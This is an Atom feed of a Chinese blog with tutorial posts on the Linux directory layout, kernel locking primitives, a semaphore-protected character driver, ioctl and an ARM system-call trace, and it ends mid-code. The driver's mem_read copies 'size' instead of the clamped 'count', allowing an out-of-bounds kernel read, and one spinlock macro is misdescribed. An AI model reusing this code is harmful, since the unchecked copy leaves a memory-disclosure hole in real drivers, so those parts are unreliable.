<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lalala&#39;s blog</title>
  
  <subtitle>努力做一名白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoururl.com/"/>
  <updated>2018-10-16T18:54:55.845Z</updated>
  <id>http://yoururl.com/</id>
  
  <author>
    <name>lalala</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux文件系统</title>
    <link href="http://yoururl.com/2018/10/17/Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <id>http://yoururl.com/2018/10/17/Linux文件系统/</id>
    <published>2018-10-16T18:48:00.000Z</published>
    <updated>2018-10-16T18:54:55.845Z</updated>
    
    <content type="html"><![CDATA[<p>rootfs其实就是，针对特定的操作系统的架构，一种实现的形式;具体表现为，特定的目录（就理解为windows的文文件夹），目录之间的关系，即组织架构，以及特定的各种文件；<br><br><br>/boot：系统启动的相关文件，如内核， initrd，以及grup（bootloader)，建议单独分区，分区千万不要做lvm<br>/dev：设备文件  </p><ul><li>块设备：随机访问，以数据块为单位</li><li>字符设备：线性访问，以字符为单位</li><li>设备号：主设备和次设备号  </li></ul><p>/etc：配置文件<br>/home：用户的家目录，每一个用户对应一个（当然在创建用户时，可不创建），建议单独分区<br>/root：管理员的家目录，不可单独分区<br>/lib：库文件<br>/lib/modules：内核模块文件</p><ul><li>静态库: 以.a结尾</li><li>动态库: 以.so结尾（类似windows .dll文件）</li></ul><p>/media：挂载点目录，以移动设备为主<br>/mnt：挂载点目录，以额外临时文件系统为主（如：USB设备）<br>/opt：可选目录，时期是用来安装第三方软件<br>/proc：伪文件系统，内核映射文件，不可单独分区，默认为空<br>/sys：伪文件系统，跟硬件设备相关属性的映射文件，不可单独分区，默认为空<br>/tmp：临时文件<br>/var/tmp：临时文件<br>/bin：可执行文件，主要是用户执行命令<br>/sbin：可执行文件，主要是管理命令<br>/usr(universal share read-only)：只读文件<br>/usr/bin：执行文件<br>/usr/sbin：执行文件<br>/usr/lib：库文件<br>/usr/local：第三方软件安装目录  </p><ul><li>/usr/local/bin  </li><li>/usr/local/sbin</li><li>/usr/local/lib<br><br></li></ul><p>busybox详细介绍：<br><a href="https://www.ibm.com/developerworks/cn/linux/l-busybox/" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-busybox/</a><br><br><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;rootfs其实就是，针对特定的操作系统的架构，一种实现的形式;具体表现为，特定的目录（就理解为windows的文文件夹），目录之间的关系，即组织架构，以及特定的各种文件；&lt;br&gt;&lt;br&gt;&lt;br&gt;/boot：系统启动的相关文件，如内核， initrd，以及grup（boot
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
    
    
      <category term="linux文件系统" scheme="http://yoururl.com/tags/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核分析（七）</title>
    <link href="http://yoururl.com/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%83%EF%BC%89/"/>
    <id>http://yoururl.com/2018/10/17/Linux内核分析（七）/</id>
    <published>2018-10-16T17:55:00.000Z</published>
    <updated>2018-10-16T18:40:21.578Z</updated>
    
    <content type="html"><![CDATA[<pre><code>* 1.并发和竞态简介* 2.竞态解决办法* 3.为我们的虚拟设备增加并发控制</code></pre><h1 id="并发和竞态简介"><a href="#并发和竞态简介" class="headerlink" title="并发和竞态简介"></a>并发和竞态简介</h1><h2 id="并发与竞态概念"><a href="#并发与竞态概念" class="headerlink" title="并发与竞态概念"></a>并发与竞态概念</h2><h3 id="何为并发"><a href="#何为并发" class="headerlink" title="何为并发"></a>何为并发</h3><p>并发是指多个执行单元同时、并行被执行。</p><h3 id="何为竞态"><a href="#何为竞态" class="headerlink" title="何为竞态"></a>何为竞态</h3><p>并发的执行单元对共享资源（硬件资源和软件上的全局变量，静态变量等）的访问容易发生竞态。</p><h3 id="我们虚拟设备的缺陷"><a href="#我们虚拟设备的缺陷" class="headerlink" title="我们虚拟设备的缺陷"></a>我们虚拟设备的缺陷</h3><p>对于我们前期的虚拟设备驱动个，假设一个执行单元A对其写入300个字符‘a’，而另一个执行单元B对其写入300个字符‘b’，第三个执行单元读取所有字符。如果A、B被顺序执行那么C读出的则不会出错，但如果A、B并发执行，那结果则是我们不可料想的。</p><h2 id="竞态发生的情况"><a href="#竞态发生的情况" class="headerlink" title="竞态发生的情况"></a>竞态发生的情况</h2><ul><li>对称多处理器（SMP）的多个CPU：SMP是一种紧耦合、共享存储的系统模型，它的特点是多个CPU使用共同的系统总线，因此可以访问共同的外设和存储器。</li><li>单CPU内进程与抢占它的进程：2.6的内核支持抢占调度，一个进程在内核执行的时候可能被另一高优先级进程打断。</li><li>中断（硬中断、软中断、tasklet、低半部）与进程之间：中断可以打断正在执行的进程，处理中断的程序和被打断的进程间也可能发生竞态。<br><br><br><br></li></ul><h1 id="竞态的解决办法"><a href="#竞态的解决办法" class="headerlink" title="竞态的解决办法"></a>竞态的解决办法</h1><p>解决竞态问题的途径是保证对共享资源的互斥访问。访问共享资源的代码区域称为临界区，临界区要互斥机制保护。Linux设备驱动中常见的互斥机制有以下方式：中断屏蔽、原子操作、自旋锁和信号量等。<br>上面我们已经分析了竞态产生的原因、发生的情况以及解决办法，下面我们对常见的解决办法一一分析。</p><h2 id="中断屏蔽"><a href="#中断屏蔽" class="headerlink" title="中断屏蔽"></a>中断屏蔽</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在单CPU中避免竞态的一种简单方法是在进入临界区之前屏蔽系统的中断。由于linux的异步I/O、进程调度等很多内容都依靠中断，所以我们应该尽快的执行完临界区的代码，换句话就是临界区代码应该尽量少。</p><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核提供了下面具体方法<br>Local_irq_disable();  //屏蔽中断<br>Local_irq_enable();  //打开中断<br>Local_irq_save(flags);  //禁止中断并保存当前cpu的中断位信息 </p><h2 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><p>原子操作指在执行过程中不会被别的代码中断的操作。</p><h3 id="具体操作-1"><a href="#具体操作-1" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核提供了一系列的函数来实现内核中的原子操作，这些操作分为两类，一类是整型原子操作，另一类是位原子操作，其都依赖底层CPU的原子操作实现，所以这些函数与CPU架构有密切关系。</p><h4 id="整型原子操作"><a href="#整型原子操作" class="headerlink" title="整型原子操作"></a>整型原子操作</h4><ul><li>设置原子变量的值<br>atomic_t v = ATOMIC_INIT(0);  //定义原子变量v并初始化为0<br>void atomic_set(atomic_t *v, int i);  //设置原子变量值为i    </li><li>获取原子变量的值<br>atomic_read(atomic_t *v);  //返回原子变量v的值  </li><li>原子变量加、减操作<br>void atomic_add(int i, atomic_t <em>v);  //原子变量v增加i<br>void atomic_sub(int I, atomic_t </em>v);  //原子变量v减少i  </li><li>原子变量自增、自减<br>void atomic_inc(atomic_t <em>v);  //原子变量v自增1<br>void atomic_dec(atomic_t </em>v);  //原子变量v自减1   </li><li>操作并测试<br>int atomic_inc_and_test(atomic_t <em>v);<br>int atomic_dec_and_test(atomic_t </em>v);<br>int atomic_sub_and_test(int i,atomic_t <em>v);<br>/</em>上述三个函数对原子变量v自增、自减和减操作（没有加）后测试其是否为0，如果为0返回true，否则返回false*/  </li><li>操作并返回<br>int atomic_add_return(int i,atomic_t <em>v);<br>int atomic_sub_return(int i,atomic_t </em>v);<br>int atomic_inc_return(atomic_t <em>v);<br>int atomic_dec_return(atomic_t </em>v);<br>/<em>上述函数对原子变量v进行自增、自减、加、减操作，并返回新的值</em>/ </li></ul><h4 id="位原子操作"><a href="#位原子操作" class="headerlink" title="位原子操作"></a>位原子操作</h4><ul><li>设置位<br>void set_bit(nr,void *addr);  //设置addr地址的第nr位，即向该位写入1。 </li><li>清除位<br>void clear_bit(nr,void *addr);  //清除addr地址的第nr位，即向该位写入0。 </li><li>改变位<br>void change_bit(nr,void *addr);  //对addr地址的第nr取反 </li><li>测试位<br>int test_bit(nr,void *addr);  //返回addr地址的第nr位 </li><li>测试并操作位<br>int test_and_set_bit(nr,void <em>addr);<br>int test_and_clear_bit(nr,void </em>addr);<br>int test_and_change_bit(nr,void <em>addr);<br>/</em>上述函数等同于执行test_bit后，再执行xxx_bit函数*/ </li></ul><h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><h3 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h3><p>自旋锁是一种对临界资源进行互斥访问的手段。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>为获得自旋锁，在某CPU上运行的代码需先执行一个原子操作，该操作测试并设置某个内存变量，由于其为原子操作，所以在该操作完成之前其他执行单元不可能访问这个内存变量，如果测试结果表明已经空闲，则程序获得这个自旋锁并继续执行，如果测试结果表明该锁仍被占用，程序将在一个小的循环内重复这个“测试并设置”操作，即进行所谓的“自旋”，通俗的说就是在“原地打转”。        </p><h3 id="具体操作-2"><a href="#具体操作-2" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与自旋锁相关的操作主要有：</p><ul><li>定义自旋锁<br>spinlock_t lock; </li><li>初始自旋锁<br>spin_lock_init(lock);</li><li>获得自旋锁<br>spin_lock(lock);  //获得自旋锁<br>lockspin_trylock(lock);  //尝试获取lock如果不能获得锁，返回假值，不在原地打转。 </li><li>释放自旋锁<br>spin_unlock(lock);  //释放自旋锁<br>为保证我们执行临界区代码的时候不被中断等影响我们的自旋锁又衍生了下面的内容</li><li>自旋锁衍生<br>  spin_lock_irq() = spin_lock() + local_irq_disable()<br>  spin_unlock_irq() = spin_unlock() + local_irq_enable()<br>  spin_lock_irqsave() = spin_lock() + local_irq_save()<br>  spin_unlock_irqrestore() = spin_unlock() + local_irq_restore()<br>  spin_lock_bh() = spin_lock() + local_bh_disable()<br>  spin_unlock_bh() = spin_unlock() + local_bh_disable() </li></ul><h3 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h3><ul><li>自旋锁实质是忙等锁，因此在占用锁时间极短的情况下，使用锁才是合理的，反之则会影响系统性能。</li><li>自旋锁可能导致系统死锁。</li><li>自旋锁锁定期间不能调用可能引起进程调度的函数。</li></ul><h2 id="读写自旋锁"><a href="#读写自旋锁" class="headerlink" title="读写自旋锁"></a>读写自旋锁</h2><h3 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h3><p>为解决自旋锁中不能允许多个单元并发读的操作，衍生出了读写自旋锁，其不允许写操作并发，但允许读操作并发。</p><h3 id="具体操作-3"><a href="#具体操作-3" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与读写自旋锁相关的操作主要有：</p><ul><li>定义和初始化读写自旋锁<br>rwlock_t my_rwlock = RW_LOCK_UNLOCKED;  //静态初始化rwlock_t   my_rwlock;<br>rwlock_init(&amp;my_rwlock);  //动态初始化   </li><li>读锁定<br>read_lock();<br>read_lock_irqsave();<br>read_lock_irq();read_lock_bh(); </li><li>读解锁<br>read_unlock();<br>read_unlock_irqrestore();<br>read_unlock_irq();read_unlock_bh(); </li><li>写锁定<br>write_lock();<br>write_lock_irqsave();<br>write_lock_irq();<br>write_lock_bh();<br>write_trylock(); </li><li>写解锁<br>  write_unlock();<br>write_unlock_irqrestore();<br>write_unlock_irq();<br>write_unlock_bh(); </li></ul><h2 id="顺序锁"><a href="#顺序锁" class="headerlink" title="顺序锁"></a>顺序锁</h2><h3 id="基本概念-4"><a href="#基本概念-4" class="headerlink" title="基本概念"></a>基本概念</h3><p>顺序锁是对读写锁的一种优化，如果使用顺序锁，读执行单元在写执行单元对被顺序锁保护的共享资源进行写操作时仍然可以继续读，不必等待写执行单元的完成，写执行单元也不需等待读执行单元完成在进行写操作。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>顺序锁保护的共享资源不含有指针，因为在写执行单元可能使得指针失效，但读执行单元如果此时访问该指针，将导致oops。</p><h3 id="具体操作-4"><a href="#具体操作-4" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与顺序锁相关的操作主要有：</p><ul><li>写执行单元获得顺序锁<br>write_seqlock();<br>write_tryseqlock();<br>write_seqlock_irqsave();<br>write_seqlock_irq();<br>write_seqlock_bh(); </li><li>写执行单元释放顺序锁<br>write_sequnlock();<br>write_sequnlock_irqrestore();<br>write_sequnlock_irq();<br>write_sequnlock_bh(); </li><li>读执行单元开始<br>read_seqbegin();<br>read_seqbegin_irqsave();  //local_irq_save + read_seqbegin </li><li>读执行单元重读<br>read_seqretry ();<br>read_seqretry_irqrestore (); </li></ul><h2 id="RCU（读—拷贝—更新）"><a href="#RCU（读—拷贝—更新）" class="headerlink" title="RCU（读—拷贝—更新）"></a>RCU（读—拷贝—更新）</h2><h3 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h3><p>RCU可以看做是读写锁的高性能版本，相比读写锁，RCU的优点在于即允许多个读执行单元同时访问被保护数据，又允许多个读执行单元和多个写执行单元同时访问被保护的数据。</p><h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>RCU不能代替读写锁。</p><h3 id="具体操作：linux内核中与RCU相关的操作主要有："><a href="#具体操作：linux内核中与RCU相关的操作主要有：" class="headerlink" title="具体操作：linux内核中与RCU相关的操作主要有："></a>具体操作：linux内核中与RCU相关的操作主要有：</h3><ul><li>读锁定<br>rcu_read_lock ();<br>rcu_read_lock_bh ();  </li><li>读解锁<br>rcu_read_unlock ();<br>rcu_read_unlock_bh (); </li><li>同步RCU<br>synchronize_rcu ();  //由RCU写执行单元调用<br>synchronize_sched();  //可以保证中断处理函数处理完毕，不能保证软中断处理结束</li><li>挂接回调<br>call_rcu ();<br>call_rcu_bh ();<br>有关RCU的操作还有很多，大家可以参考网络。</li></ul><h2 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h2><h3 id="基本概念-5"><a href="#基本概念-5" class="headerlink" title="基本概念"></a>基本概念</h3><p>信号量用于保护临界区的常用方法与自旋锁类似，但不同的是当获取不到信号量时，进程不会原地打转而是进入休眠等待状态。</p><h3 id="具体操作-5"><a href="#具体操作-5" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与信号量相关的操作主要有：</p><ul><li>定义信号量<br>Struct semaphore sem; </li><li>初始化信号量<br>void sema_init(struct semaphore *sem, int val);  //初始化sem为val，当然还有系统定义的其他宏初始化，这里不列举 </li><li>获得信号量<br>void down(struct semaphore <em>sem);  //获得信号量sem，其会导致睡眠，并不能被信号打断<br>int down_interruptible(struct semaphore </em>sem);  //进入睡眠可以被信号打断<br>int down_trylock(struct semaphore *sem);  //不会睡眠 </li><li>释放信号量　　<br>void up(struct semaphore *sem);  //释放信号量，唤醒等待进程<br>注：当信号量被初始为0时，其可以用于同步。</li></ul><h2 id="Completion用于同步"><a href="#Completion用于同步" class="headerlink" title="Completion用于同步"></a>Completion用于同步</h2><h3 id="基本概念-6"><a href="#基本概念-6" class="headerlink" title="基本概念"></a>基本概念</h3><p>linux中的同步机制。</p><h3 id="具体操作-6"><a href="#具体操作-6" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与Completion相关的操作主要有：</p><ul><li>定义Completion<br>struct completion *my_completion; </li><li>初始化Completion<br>void init_completion(struct completion *x); </li><li>等待Completion<br>void wait_for_completion(struct completion *); </li><li>唤醒Completion　　<br>void complete(struct completion <em>);  //唤醒一个 　　<br>void complete_all(struct completion </em>);  //唤醒该Completion的所有执行单元 </li></ul><h2 id="读写信号量"><a href="#读写信号量" class="headerlink" title="读写信号量"></a>读写信号量</h2><h3 id="基本概念-7"><a href="#基本概念-7" class="headerlink" title="基本概念"></a>基本概念</h3><p>与自旋锁和读写自旋锁的关系类似</p><h3 id="具体操作-7"><a href="#具体操作-7" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与读写信号量相关的操作主要有：</p><ul><li>定义和初始化读写自旋锁<br>struct rw_semaphore sem;<br>init_rwsem(&amp;sem); </li><li>读信号量获取<br>down_read ();<br>down_read_trylock(); </li><li>读信号量释放<br>up_read (); </li><li>写信号量获取<br>down_write ();<br>down_write_trylock ();</li><li>写信号量释放<br>up_write(); </li></ul><h2 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h2><h3 id="基本概念-8"><a href="#基本概念-8" class="headerlink" title="基本概念"></a>基本概念</h3><p>用来实现互斥操作</p><h3 id="具体操作-8"><a href="#具体操作-8" class="headerlink" title="具体操作"></a>具体操作</h3><p>linux内核中与互斥体相关的操作主要有：</p><ul><li>定义和初始化互斥体<br>struct mutex lock;mutex_init(&amp;lock); </li><li>获取互斥体<br>void mutex_lock(struct mutex <em>lock);<br>int mutex_lock_interruptible(struct mutex </em>lock);<br>int mutex_lock_killable(struct mutex *lock); </li><li>释放互斥体<br>void mutex_unlock(struct mutex *lock);  </li></ul><p>上面我们介绍了linux内核中为了解决竞态所提供的方法，我们下面使用信号量为我们的虚拟设备增加并发控制。<br><br><br><br></p><h1 id="为我们的虚拟设备增加并发控制"><a href="#为我们的虚拟设备增加并发控制" class="headerlink" title="为我们的虚拟设备增加并发控制"></a>为我们的虚拟设备增加并发控制</h1><p>我们增加了并发控制后的代码如下，详细代码参考https:  //github.com/wrjvszq/myblongs  </p><pre><code>struct mem_dev{    struct cdev cdev;    int mem[MEM_SIZE];  //全局内存4k    dev_t devno;    struct semaphore sem;  //并发控制所使用的信号量};static ssize_t mem_write(struct file *filp, const char __user *buf, size_t size, loff_t *ppos){    unsigned long p = *ppos;    unsigned int count = size;    int ret = 0;    int *pbase = filp -&gt; private_data;    if(p &gt;= MEM_SIZE)        return 0;    if(count &gt; MEM_SIZE - p)        count = MEM_SIZE - p;    if(down_interruptible(&amp;my_dev.sem))  //获取信号量        return - ERESTARTSYS;    if(copy_from_user(pbase + p,buf,count)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    up(&amp;my_dev.sem);  //释放信号量    return ret;}static ssize_t mem_read(struct file *filp, char __user *buf, size_t size, loff_t *ppos){    int * pbase = filp -&gt; private_data;/*获取数据地址*/    unsigned long p = *ppos;/*读的偏移*/    unsigned int count = size;/*读数据的大小*/    int ret = 0;    if(p &gt;= MEM_SIZE)/*合法性判断*/        return 0;    if(count &gt; MEM_SIZE - p)/*读取大小修正*/        count = MEM_SIZE - p;    if(down_interruptible(&amp;my_dev.sem))  //获取信号量        return - ERESTARTSYS;    if(copy_to_user(buf,pbase + p,size)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    up(&amp;my_dev.sem);  //释放信号量    return ret;}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;* 1.并发和竞态简介
* 2.竞态解决办法
* 3.为我们的虚拟设备增加并发控制
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;并发和竞态简介&quot;&gt;&lt;a href=&quot;#并发和竞态简介&quot; class=&quot;headerlink&quot; title=&quot;并发和竞态简介&quot;&gt;&lt;/a
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
    
      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
    
      <category term="linux内核" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核分析（六）</title>
    <link href="http://yoururl.com/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E5%85%AD%EF%BC%89/"/>
    <id>http://yoururl.com/2018/10/17/Linux内核分析（六）/</id>
    <published>2018-10-16T17:39:00.000Z</published>
    <updated>2018-10-16T17:53:32.591Z</updated>
    
    <content type="html"><![CDATA[<pre><code>* 1.字符设备控制方法实现* 2.揭秘系统调用本质</code></pre><h1 id="字符设备控制方法实现"><a href="#字符设备控制方法实现" class="headerlink" title="字符设备控制方法实现"></a>字符设备控制方法实现</h1><h2 id="设备控制简介"><a href="#设备控制简介" class="headerlink" title="设备控制简介"></a>设备控制简介</h2><ul><li>何为设备控制：我们所接触的大部分设备，除了读、写、打开关闭等方法外，还应该具有控制方法，比如：控制电机转速、串口配置波特率等。这就是对设备的控制方法。</li><li>用户如何进行设备控制：类似与我们在用户空间使用read、open等函数对设备进行操作，我们在用户空间对设备控制的函数是ioctl其原型为 int ioctl(int fd, int cmd, …)//fd为要控制的设备文件的描述符，cmd是控制命令，…依据第二个参数类似与我们的printf等多参函数。 </li><li>Ioctl调用驱动那个函数：在我们的用户层进行ioctl调用的时候驱动会根据内核版本不同调用不同的函数：<br>2.6.36以前的内核版本会调用 long (<em>ioctl) (struct inode</em>,struct file <em>, unsigned int, unsigned long);<br>2.6.36以后的内核会调用 long (</em>unlocked_ioctl) (struct file *, unsigned int, unsigned long); </li></ul><h2 id="Ioctl实现"><a href="#Ioctl实现" class="headerlink" title="Ioctl实现"></a>Ioctl实现</h2><h3 id="控制命令解析"><a href="#控制命令解析" class="headerlink" title="控制命令解析"></a>控制命令解析</h3><p>我们刚才说到ioctl进行控制的时候有个cmd参数其为int类型的也就是32位，我们的linux为了让这32位更加有意义，所表示的内容更多，所以将其分为了下面几个段  </p><ul><li>Type（类型/幻数8bit）：表明这是属于哪个设备的命令  </li><li>Number（序号8bit）：用来区分统一设备的不同命令  </li><li>Direction（2bit）：参数传递方向，可能的取值，_IOC_NODE（没有数据传输）、_IOC_READ（从设备读）、_IOC_WRITE（向设备写）  </li><li>Size（13/14bit()）：参数长度  </li></ul><h3 id="定义命令"><a href="#定义命令" class="headerlink" title="定义命令"></a>定义命令</h3><p>我们的控制命令如此复杂，为了方便我们的linux系统提供了固定的宏来解决命令的定义，具体如下：  </p><ul><li>_IO(type,nr); ：定义不带参数的命令</li><li>_IOR(type,nr,datatype); ：从设备读参数命令</li><li>_IOW(type,nr,datatype); ：向设备写入参数命令  </li></ul><p>下面定义一个向设备写入参数的命令例子  </p><p>#define MEM_CLEAR _IOW(‘m’,0,int)//通常用一个字母来表示命令的类型  </p><h3 id="Ioctl实现-1"><a href="#Ioctl实现-1" class="headerlink" title="Ioctl实现"></a>Ioctl实现</h3><p>下面我们去向我们上次实现的字符设备中添加ioctl方法，并实现设备重启命令（虚拟重启），对于不支持的命令我们返回-EINVAL代码如下:</p><pre><code>long mem_ioctl(struct file *fd, unsigned int cmd, unsigned long arg){    switch(cmd){        case MEM_RESTART:        printk(&quot;&lt;0&gt; memdev is restart&quot;);        break;        default:        return -EINVAL;    }    return 0;}</code></pre><p><br><br><br></p><h1 id="揭秘系统调用本质"><a href="#揭秘系统调用本质" class="headerlink" title="揭秘系统调用本质"></a>揭秘系统调用本质</h1><p>由于我自己的PC的调用过程不太熟悉，下面以arm的调用过程分析一下我们用户层调用read之后发生了什么，是怎么调用到我们驱动写的read函数的呢，我们下面进行深入剖析。  </p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>我们首先使用得到arm上可执行的应用程序 arm-linux-gcc -g -static read_mem.c -o read_mem<br>然后使用arm-linux-objdump -D -S read_mem &gt;dump 得到汇编文件，我们找到main函数的汇编实现</p><pre><code>int main(void){    8228: e92d4800 push {fp, lr}    822c: e28db004 add fp, sp, #4 ; 0x4    8230: e24dd008 sub sp, sp, #8 ; 0x8    int fd = 0;    8234: e3a03000 mov r3, #0 ; 0x0    8238: e50b3008 str r3, [fp, #-8]    int test = 0;    823c: e3a03000 mov r3, #0 ; 0x0    8240: e50b300c str r3, [fp, #-12]    fd = open(&quot;/dev/memdev0&quot;,O_RDWR);    8244: e59f004c ldr r0, [pc, #76] ; 8298 &lt;main+0x70&gt;    8248: e3a01002 mov r1, #2 ; 0x2    824c: eb0028a3 bl 124e0 &lt;__libc_open&gt;    8250: e1a03000 mov r3, r0    8254: e50b3008 str r3, [fp, #-8]    read(fd,&amp;test,sizeof(int));    8258: e24b300c sub r3, fp, #12 ; 0xc    825c: e51b0008 ldr r0, [fp, #-8]    8260: e1a01003 mov r1, r3    8264: e3a02004 mov r2, #4 ; 0x4    8268: eb0028e4 bl 12600 &lt;__libc_read&gt;//我们的read函数最终调用了__libc_read    printf(&quot;the test is %d\n&quot;,test);    826c: e51b300c ldr r3, [fp, #-12]    8270: e59f0024 ldr r0, [pc, #36] ; 829c &lt;main+0x74&gt;    8274: e1a01003 mov r1, r3    8278: eb000364 bl 9010 &lt;_IO_printf&gt;    close(fd);    827c: e51b0008 ldr r0, [fp, #-8]    8280: eb0028ba bl 12570 &lt;__libc_close&gt;    return 0;    8284: e3a03000 mov r3, #0 ; 0x0}</code></pre><p>在上面代码中大部分汇编指令都知道用法，但是svc调用引起注意，通过查阅资料才发现，我们应用程序通过svc 0x00000000可以产生异常，进入内核空间。<br>然后呢，系统处理异常，这中间牵扯好多代码还有中断的一些知识，我们找时间在专门分析，总之经过一大堆的处理最后它会跳到entry-common.S中的下面代码：  </p><pre><code>.align    5ENTRY(vector_swi)    sub    sp, sp, #S_FRAME_SIZE    stmia    sp, {r0 - r12}            @ Calling r0 - r12ARM(    add    r8, sp, #S_PC        )ARM(    stmdb    r8, {sp, lr}^        )    @ Calling sp, lrTHUMB(    mov    r8, sp            )THUMB(    store_user_sp_lr r8, r10, S_SP    )    @ calling sp, lr    mrs    r8, spsr            @ called from non-FIQ mode, so ok.    str    lr, [sp, #S_PC]            @ Save calling PC    str    r8, [sp, #S_PSR]        @ Save CPSR    str    r0, [sp, #S_OLD_R0]        @ Save OLD_R0    zero_fp    /*     * Get the system call number.     */#if defined(CONFIG_OABI_COMPAT)    /*     * If we have CONFIG_OABI_COMPAT then we need to look at the swi     * value to determine if it is an EABI or an old ABI call.     */#ifdef CONFIG_ARM_THUMB    tst    r8, #PSR_T_BIT    movne    r10, #0                @ no thumb OABI emulation    ldreq    r10, [lr, #-4]            @ get SWI instruction#else    ldr    r10, [lr, #-4]            @ get SWI instruction  A710(    and    ip, r10, #0x0f000000        @ check for SWI        )  A710(    teq    ip, #0x0f000000                        )  A710(    bne    .Larm710bug                        )#endif#ifdef CONFIG_CPU_ENDIAN_BE8    rev    r10, r10            @ little endian instruction#endif#elif defined(CONFIG_AEABI)    /*     * Pure EABI user space always put syscall number into scno (r7).     */  A710(    ldr    ip, [lr, #-4]            @ get SWI instruction    )  A710(    and    ip, ip, #0x0f000000        @ check for SWI        )  A710(    teq    ip, #0x0f000000                        )  A710(    bne    .Larm710bug                        )#elif defined(CONFIG_ARM_THUMB)    /* Legacy ABI only, possibly thumb mode. */    tst    r8, #PSR_T_BIT            @ this is SPSR from save_user_regs    addne    scno, r7, #__NR_SYSCALL_BASE    @ put OS number in    ldreq    scno, [lr, #-4]#else    /* Legacy ABI only. */    ldr    scno, [lr, #-4]            @ get SWI instruction  A710(    and    ip, scno, #0x0f000000        @ check for SWI        )  A710(    teq    ip, #0x0f000000                        )  A710(    bne    .Larm710bug                        )#endif#ifdef CONFIG_ALIGNMENT_TRAP    ldr    ip, __cr_alignment    ldr    ip, [ip]    mcr    p15, 0, ip, c1, c0        @ update control register#endif    enable_irq    get_thread_info tsk    adr    tbl, sys_call_table        @ load syscall table pointer</code></pre><p>该段代码中我们先会获取系统调用的标号刚才让大家记住的3，然后呢会去查找sys_call_table我们找到</p><pre><code>.type    sys_call_table, #objectENTRY(sys_call_table)#include &quot;calls.S&quot;#undef ABI#undef OBSOLETE</code></pre><p>在calls.S中我们找到了下面东西（列出部分）</p><pre><code>*//* 0 */        CALL(sys_restart_syscall)        CALL(sys_exit)        CALL(sys_fork_wrapper)        CALL(sys_read)        CALL(sys_write)/* 5 */        CALL(sys_open)        CALL(sys_close)        CALL(sys_ni_syscall)        /* was sys_waitpid */        CALL(sys_creat)        CALL(sys_link)</code></pre><p>我们发现我们刚才记住的数字3刚好对应的是sys_read，在read_write.c中我们可以找到sys_read函数</p><pre><code>SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count){    struct file *file;    ssize_t ret = -EBADF;    int fput_needed;    file = fget_light(fd, &amp;fput_needed);    if (file) {        loff_t pos = file_pos_read(file);        ret = vfs_read(file, buf, count, &amp;pos);//调用虚拟文件系统的read        file_pos_write(file, pos);        fput_light(file, fput_needed);    }    return ret;}</code></pre><p>关于SYSCALL_DEFINE3这个宏的解析大家可以去<a href="http://blog.csdn.net/p_panyuch/article/details/5648007" target="_blank" rel="noopener">http://blog.csdn.net/p_panyuch/article/details/5648007</a> 这篇文章查看，在此我就不分析了，我们继续找到vfs_read代码如下：</p><pre><code>  ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos){    ssize_t ret;    if (!(file-&gt;f_mode &amp; FMODE_READ))        return -EBADF;    if (!file-&gt;f_op || (!file-&gt;f_op-&gt;read &amp;&amp; !file-&gt;f_op-&gt;aio_read))        return -EINVAL;    if (unlikely(!access_ok(VERIFY_WRITE, buf, count)))        return -EFAULT;    ret = rw_verify_area(READ, file, pos, count);    if (ret &gt;= 0) {        count = ret;        if (file-&gt;f_op-&gt;read)//我们的文件读函数指针不为空            ret = file-&gt;f_op-&gt;read(file, buf, count, 